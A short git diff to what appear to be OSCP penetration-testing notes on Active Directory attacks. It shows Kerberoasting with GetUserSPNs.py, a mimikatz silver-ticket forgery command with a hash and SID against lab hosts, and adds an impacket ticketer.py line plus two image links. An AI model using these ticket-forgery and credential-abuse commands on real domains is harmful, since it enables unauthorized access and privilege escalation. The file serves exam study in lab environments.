@@ -267,6 +267,8 @@ GetUserSPNs.py -request -dc-ip 10.129.193.5 active.htb/svc_tgs
 ```
 
 ## Silver Tickets
+![image](https://github.com/nuricheun/OSCP/assets/14031269/d19bd307-1d00-478a-925c-370b483dce13)
+![image](https://github.com/nuricheun/OSCP/assets/14031269/472ec5a4-4224-4b09-b2c4-6662e97865d9)
 ```bash
 #Get domain SID
 whoami /user
@@ -274,7 +276,11 @@ whoami /user
 #mimikatz silver ticket attack
 kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin
 iwr -UseDefaultCredentials http://web04
+
+# on kali machine
+ticketer.py -spn SPN -domain-sid DOMAIN SID -nthash NTLM -dc-ip IP_VICTIM -domain domain Administrator
 ```
+
 
 
 ## Add user
